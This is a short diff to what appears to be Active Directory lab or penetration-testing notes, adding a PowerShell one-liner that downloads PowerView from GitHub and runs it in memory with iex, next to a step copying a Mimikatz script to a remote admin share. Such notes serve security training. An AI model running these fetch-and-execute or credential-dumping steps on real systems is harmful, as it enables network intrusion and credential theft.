@@ -63,6 +63,11 @@ Copy files
 Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
+Download
+```powershell
+iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"))
+```
+
 ## Enumeration
 
 #### PowerView
